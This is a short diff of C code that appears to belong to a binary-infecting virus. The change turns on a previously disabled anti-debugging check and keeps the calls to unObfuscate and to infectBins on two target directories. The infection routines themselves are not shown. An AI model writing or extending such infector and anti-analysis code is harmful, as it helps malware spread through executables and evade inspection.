@@ -10,16 +10,16 @@ int   entry_point(void *magic) {
 
   if (checkProcess(procName) != 0)
     return (stop(1, magic));
-  /* if ((ret = preventDebug()) == -1) */
-  /*   return (stop(1, magic)); */
+  if ((ret = preventDebug()) == -1)
+    return (stop(1, magic));
   if (ret == 1)
     return (stop(0, magic));
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
-      return (stop(1, magic));
+      exit(1);
   infectBins(infectDir);
   infectBins(infectDir2);
-  return (stop(0, magic));
+  exit(0);
 }
 
 static int   stop(int status, void *magic) {
